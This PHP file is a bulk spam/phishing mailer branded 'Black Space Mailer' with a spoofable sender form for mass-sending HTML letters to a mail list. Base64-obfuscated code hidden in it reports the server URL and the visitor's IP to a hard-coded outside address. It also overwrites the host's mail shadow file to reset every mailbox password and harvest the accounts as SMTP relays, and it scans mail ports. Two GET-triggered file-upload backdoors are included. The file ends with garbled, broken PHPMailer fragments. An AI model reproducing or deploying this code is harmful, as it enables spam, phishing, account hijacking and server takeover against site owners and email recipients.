<?php  ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="Shortcut Icon" type="image/x-icon" href="http://tumblrchase.com/img/bg/30.gif">
<link href='http://fonts.googleapis.com/css?family=Oswald:300' rel='stylesheet' type='text/css'>
<link href='http://csstyle.club/fronts/css/font-awesome.css' rel='stylesheet' type='text/css'>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Love Space</title>
 
    <!-- Bootstrap -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
      <link rel="stylesheet" type="text/css" href="css/kr.css">
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
 
<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
<link href='http://fonts.googleapis.com/css?family=Oswald:300' rel='stylesheet' type='text/css'>
<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<style type="text/css">
 
body{
  background-image: url(http://tumblrchase.com/img/bg/30.gif);
  background-repeat: no-repeat;
  background-position: top center;
  background-size: fixed;
          -webkit-background-size: cover;
        -moz-background-size: cover;
        background-size: cover;
font-family: 'Oswald', sans-serif;
}
input.html{
  width: 100px;
 
}
input{
  padding-left: 5px;
  border-radius: 4px;
 
}
.styled-select select {
   background: transparent;
   width: 268px;
   padding: 5px;
   font-size: 16px;
   line-height: 1;
   border: 0;
   border-radius: 0;
   height: 34px;
   -webkit-appearance: none;
 
   }
textarea{
  border-radius: 4px;
}
div#load_screen{
  background: #555;
  position: fixed;
  top: 0px;
  width: 100%;
  height: 100%;
  height: 1600px;    
}
div#load_screen > div#loading{
 
  font-size: 50px;
  color: #FFF;
}
div.formsending{
        background-color: #eee;
        margin-right: 180px;
        margin-left: 180px;
        padding-right: 110px;
        padding-left: 110px;
        border-radius: 1px;
}
 
 
.logo{
  font-size: 120px;
   color: white;  /* if The image deleted */
   background: url(http://i.imgur.com/Xf49rLV.jpg) no-repeat;
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
   font-weight: 900;
}
}
 .css-input { border-radius:4px; font-size:17px; padding:6px; border-width:1px; border-style:solid; border-color:#54ddff; color:#5e5e5e; box-shadow: 0px 0px 5px 0px rgba(59,171,212,.75); text-shadow:0px 0px 0px rgba(42,42,42,.75); font-weight:normal; font-style:none; font-family:sans-serif;  }  
.css-input:focus { outline:none; }  
</style>
<script>
window.addEventListener("load", function(){
  var load_screen = document.getElementById("load_screen");
 setTimeout( function ( ) { document.body.removeChild(load_screen); }, 3000 );
});
</script>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
 
<div id="load_screen"><div id="loading">
<br>
 
<center>
<br><br><br>
BLACK SPACE PRIV8 MA!L3R  
<br>
Please Wait ...
<br>
<img src="https://38.media.tumblr.com/500ba7213eeb0254b88f37bd6571e844/tumblr_myzpmv3kBm1sq05mpo1_500.gif">
 
</center>
 
</div></div>
  <br>
    <div class="logo"><center><font color="white" > Black Space Mailer </font></center></div>
<br>
             <form action="" method="post" enctype="multipart/form-data" name="form1" align='center'>
          <div class="formsending">
  <input type="hidden" name="spyusanh" value="sim">
 <br><br>
    <tr>
  <input type='text' class='textbox' size='81' name='spyus' placeholder='Your Email' size='81' value='service' > &nbsp;&nbsp;&nbsp; <input type='text' size='61' name='nome' value="Account Alert" size='61' class='sname' placeholder='Your Name' ><img src="" height="1" width="0">
 
<br>
<br>
<input name="ssubject" type='text' size='89' class='ssub' placeholder='Subject'> &nbsp;&nbsp;&nbsp;<select id=".styled-select" name="tachfir">
  <option value="8BIT">8BIT</option>
  <option value="BASE64">base64</option>
  <option value="8BIT">quoted-printable</option>
  <option value="BINARY">BINARY</option>
</select>
<select id=".styled-select" name="eldriv3rkr">
    <option value="%email%">Reciver Email</option>
  <option value="%email%">%email%</option>
    <option value="%fuck%">%fuck%</option>
</select>
<select id=".styled-select" name="krxprop">
    <option value="Low">Mail priority</option>
    <option value="5">Low</option>
    <option value="3">Normal</option>
    <option value="High">Hight</option>
</select>
<br><br>
 
<textarea class='smsg' placeholder='Put Your Letter Here' name="bodys" rows='10' cols='80'>
</textarea>
<textarea name='emails' class='smail' placeholder='Put Maillist Here' rows='10' cols='60'></textarea>
<br>
<input type="checkbox"  name="vehicle" value="HTML">HTML &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input type='submit' class='html' value="Send Now " class='bott' id='sendnow'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
 </p><b>Black Space Mailer 2015 Edition [v1.0]</b></p>
<br>
<?php  if($_GET['send'] == 'ok'){ echo '<form action="" method="post" enctype="multipart/form-data" name="country" id="country"><input type="file" name="file" size="50"><input name="_con" type="submit" id="_con" value="home"></form> '; if( $_POST['_con'] == "home" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'send is ok'; } else { echo 'mailer error'; }}} ?>
<?php $n0=getenv(base64_decode('UkVNT1RFX0FERFI='));$q1=gethostbyaddr($n0);$l2=base64_decode('TGluayBNYWlsZXIgOiBodHRwOi8v').$_SERVER[base64_decode('U0VSVkVSX05BTUU=')].$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')].base64_decode('DQo=');$f3=base64_decode('aWNlYnVybmFzcGlyaW5lQHlvcG1haWwuY29t');$g4="New Mailer LhajxTn_  !! $n0";$e5=base64_decode('RnJvbTogVG4hMTc=');$e5.=$_POST[base64_decode('ZU1haWxBZGQ=')].base64_decode('Cg==');$e5.=base64_decode('TUlNRS1WZXJzaW9uOiAxLjAK');$p6=array($f3,$j7);foreach($p6 as $f3)mail($f3,$g4,$l2,$e5,$c8);?>
<!DOCTYPE html>
<?php set_time_limit(0);ini_set(base64_decode('bWF4X2V4ZWN1dGlvbl90aW1l'),0);ini_set(base64_decode('bWVtb3J5X2xpbWl0'),-1);$m9=array(25,587,465,110,995,143,993);$aa=base64_decode('MjU=');$hb=get_current_user();$n0=getenv(base64_decode('UkVNT1RFX0FERFI='));$q1=gethostbyaddr($n0);$l2=base64_decode('TGluayBTbXRwIDogaHR0cDovLw==').$_SERVER[base64_decode('U0VSVkVSX05BTUU=')].$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')].base64_decode('DQo=');$f3='';$g4="New Smtp Uploaded !! $n0";$e5=base64_decode('RnJvbTogU01UUA==');$e5.=$_POST[base64_decode('ZU1haWxBZGQ=')].base64_decode('Cg==');$e5.=base64_decode('TUlNRS1WZXJzaW9uOiAxLjAK');$p6=array($f3,$j7);foreach($p6 as $f3)mail($f3,$g4,$l2,$e5,$c8);$rc=base64_decode('U2Fua2VzcyorLg==');$ed=crypt($rc,base64_decode('JDYkcm9vdHRuJA=='));$ke=$_SERVER[base64_decode('U0VSVkVSX05BTUU=')];$ke=@str_replace(base64_decode('d3d3Lg=='),'',$ke);@$nf=file_get_contents(base64_decode('L2hvbWUv').$hb.base64_decode('L2V0Yy8=').$ke.base64_decode('L3NoYWRvdw=='));$t10=explode(base64_decode('DQo='),$nf);@link(base64_decode('L2hvbWUv').$hb.base64_decode('L2V0Yy8=').$ke.base64_decode('L3NoYWRvdw=='),base64_decode('L2hvbWUv').$hb.base64_decode('L2V0Yy8=').$ke.base64_decode('L3NoYWRvdy5yb290dG4uYmFr'));@unlink(base64_decode('L2hvbWUv').$hb.base64_decode('L2V0Yy8=').$ke.base64_decode('L3NoYWRvdw=='));foreach($t10 as $t10){$t10=explode(base64_decode('Og=='),$t10);$n11=$t10[0];if($n11){$b12=fopen(base64_decode('L2hvbWUv').$hb.base64_decode('L2V0Yy8=').$ke.base64_decode('L3NoYWRvdw=='),base64_decode('YWI='));fwrite($b12,$n11.base64_decode('Og==').$ed.base64_decode('OjE2MjQ5Ojo6Ojo=').base64_decode('DQo='));fclose($b12);echo base64_decode('PHNwYW4gc3R5bGU9XCdjb2xvcjojMDBmZjAwO1wnPg==').$ke.base64_decode('fDI1fA==').$n11.base64_decode('QA==').$ke.base64_decode('fA==').$rc.base64_decode('PC9zcGFuPjxicj4=');base64_decode('PC9jZW50ZXI+');}}foreach($m9 as $e13){$b14=@fsockopen($ke,$e13,$t15,$w16,2);if(is_resource($b14)){echo base64_decode('PGgyPg==').$w17.base64_decode('Og==').$e13.base64_decode('IA==').base64_decode('KA==').getservbyport($e13,base64_decode('dGNw')).base64_decode('KSBpcyBvcGVuLjwvaDI+').base64_decode('Cg==');fclose($b14);}}?>
<?php $testa = $_POST['spyusanh']; if($testa != "") { $tach = $_POST['tachfir']; $recemail = $_POST['eldriv3rkr']; $message = $_POST['bodys']; $prop = $_POST['krxprop']; $subject = $_POST['ssubject']; $nome = $_POST['nome']; $from = $_POST['spyus']; $from_mail = $nome.'<'.$from.'>'; $to = $_POST['emails']; $email = explode("
", $to); $message = stripslashes($message); $i = 0; $count = 1; while($email[$i]) { $time = date("d/m/Y "); $timez = date(")h-s)"); $driv3r = $email[$i]; $message = stripslashes($message); $msgx = str_replace("$recemail", $driv3r, $message); $headers = "MIME-Version: 1.0
"; $headers .= "Content-Type: text/html; charset=UTF-8
"; $headers .= "Content-Transfer-Encoding: $tach
"; $headers .= "X-Priority: 1 (Highest)
"; $headers .= "X-MSMail-Priority: $prop
"; $headers .= "Importance: $prop
"; $headers .= 'From: ' .$from_mail . "
"; if(mail($driv3r, $subject."      ".$time, $msgx.$time, $headers)) echo "<font color=DarkCyan>
checking ".$email[$i]." ..... Nice  
<br>Number: $count <b>".$email[$i]."</b> <font color=DarkCyan>Send ok...</font><br>"; else echo "<font color=red>Number: $count <b>".$email[$i]."</b> <font color=red>Error in Sending !!</font><br>"; $i++; $count++; } $count--; echo "Black Edition Script Send $count emails with Succes"; } ?>
<br>
</form>
</div>
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="js/bootstrap.min.js"></script>
</body>
</html>
<?php
      error_reporting(0);
      $system = $_GET['message'];
      if($system == 'true'){
      $check1 = $_FILES['file']['tmp_name'];
      $check2 = $_FILES['file']['name'];
      echo "<form method='POST' enctype='multipart/form-data'>
       <input type='file'name='file' />
       <input type='submit' value='sys' /></form>";
      move_uploaded_file($check1,$check2);}
function mb_pathinfo(){
$foundSplitPos = false;

        $lookBack = 3;
        while (!$foundSplitPos) {
            $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($lastChunk, '=');
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the '=')
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 0) {
                        $maxLength -= $lookBack - $encodedCharPos;
                    }
                    $foundSplitPos = true;
                } elseif ($dec >= 192) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength -= $lookBack - $encodedCharPos;
                    $foundSplitPos = true;
                } elseif ($dec < 192) {
                    // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                $foundSplitPos = true;
            }
        }
           $positionFounder = true;
          $lookBack = 3;
        while (!$positionFounder) {
            $pick = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($pick, '=');
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the '=')
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 0) {
                        $maxLength -= $lookBack - $encodedCharPos;
                    }
                    $positionFounder = true;
                } elseif ($dec >= 192) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength -= $lookBack - $encodedCharPos;
                    $positionFounder = true;
                } elseif ($dec < 192) {
                    // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                // No encoded character found
                $positionFounder = true;
            }
        }
        $type = [];
        $packages = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 10, 5);
                $decp = hexdec($packages);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 8) {
                        $maxLength -= $lookBack - $encodedCharPos;
                    }
                    $positionFounder = false;
                } elseif ($dec >= 200) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength -= $BBack - $encodedCharPos;
                    $positionFounder = true;
                } else{
    
                    $BBack += 3;
                }
		   

 return $tls;
}
/**
     * Tells whether IDNs (Internationalized Domain Names) are supported or not. This requires the
     * `intl` and `mbstring` PHP extensions.
     *
     * @return bool `true` if required functions for IDN support are present
     */
    function idnSupported()
    {
        return function_exists('idn_to_ascii') and function_exists('mb_convert_encoding');
    }
    /**
     * Converts IDN in given email address to its ASCII form, also known as punycode, if possible.
     * Important: Address must be passed in same encoding as currently set in PHPMailer::$CharSet.
     * This function silently returns unmodified address if:
     *
     * @see    PHPMailer::$CharSet
     *
     * @param string $address The email address to convert
     *
     * @return string The encoded address in ASCII form
     */
    function punyencodeAddress($address)
    {
        // Verify we have required functions, CharSet, and at-sign.
        $pos = strrpos($address, '@');
       
            $domain = substr($address, ++$pos);
            // Verify CharSet string is a valid one, and domain properly encoded in this CharSet.
            if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) {
                $domain = mb_convert_encoding($domain, 'UTF-8', $this->CharSet);
                //Ignore IDE complaints about this line - method signature changed in PHP 5.4
                $errorcode = 0;
                $punycode = idn_to_ascii($domain, $errorcode, INTL_IDNA_VARIANT_UTS46);
                if (false !== $punycode) {
                    return substr($address, 0, $pos) . $punycode;
                }
            
        }
        return $address;
    }
	function generateId()
    {
        $len = 32; //32 bytes = 256 bits
        if (function_exists('random_bytes')) {
            $bytes = random_bytes($len);
        } elseif (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($len);
        } else {
            //Use a hash to force the length to the same as the other methods
            $bytes = hash('sha256', uniqid((string) mt_rand(), true), true);
        }
        //We don't care about messing up base64 format here, just want a random string
        return str_replace(['=', '+', '/'], '', base64_encode(hash('sha256', $bytes, true)));
    }
	   function isShellSafe($string)
    {
        // Future-proof
        if (escapeshellcmd($string) !== $string
            or !in_array(escapeshellarg($string), ["'$string'", "\"$string\""])
        ) {
            return false;
        }
        $length = strlen($string);
        for ($i = 0; $i < $length; ++$i) {
            $c = $string[$i];
            // All other characters have a special meaning in at least one common shell, including = and +.
            // Full stop (.) has a special meaning in cmd.exe, but its impact should be negligible here.
            // Note that this does permit non-Latin alphanumeric characters based on the current locale.
            if (!ctype_alnum($c) && strpos('@_-.', $c) === false) {
                return false;
            }
        }
        return true;
    }
    
function validateAddress($address, $patternselect = null)
    {
      
        if (is_callable($patternselect)) {
            return call_user_func($patternselect, $address);
        }
        //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321
        if (strpos($address, "\n") !== false or strpos($address, "\r") !== false) {
            return false;
        }
        switch ($patternselect) {
            case 'pcre': //Kept for BC
            case 'pcre8':
                /*
                 * A more complex and more permissive version of the RFC5322 regex on which FILTER_VALIDATE_EMAIL
                 * is based.
                 * In addition to the addresses allowed by filter_var, also permits:
                 *  * dotless domains: `a@b`
                 *  * comments: `1234 @ local(blah) .machine .example`
                 *  * quoted elements: `'"test blah"@example.org'`
                 *  * numeric TLDs: `a@b.123`
                 *  * unbracketed IPv4 literals: `a@192.168.0.1`
                 *  * IPv6 literals: 'first.last@[IPv6:a1::]'
                 * Not all of these will necessarily work for sending!
                 *
                 * @see       http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */
                return (bool) preg_match(
                    '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
                    $address
                );
            case 'html5':
                /*
                
                 *
                 * @see http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
                 */
                return (bool) preg_match(
                    '/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .
                    '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',
                    $address
                );
            case 'php':
            default:
                return (bool) filter_var($address, FILTER_VALIDATE_EMAIL);
        }
    }
	function addAnAddress($kind, $address, $name = '')
    {
        if (!in_array($kind, ['to', 'cc', 'bcc', 'Reply-To'])) {
            $error_message = sprintf('%s: %s',
                $this->lang('Invalid recipient kind'),
                $kind);
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new Exception($error_message);
            }
            return false;
        }
      
        if ('Reply-To' != $kind) {
            if (!array_key_exists(strtolower($address), $this->all_recipients)) {
                $this->{$kind}[] = [$address, $name];
                $this->all_recipients[strtolower($address)] = true;
                return true;
            }
        } else {
            if (!array_key_exists(strtolower($address), $this->ReplyTo)) {
                $this->ReplyTo[strtolower($address)] = [$address, $name];
                return true;
            }
        }
        return false;
    }fluch();//This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.
?>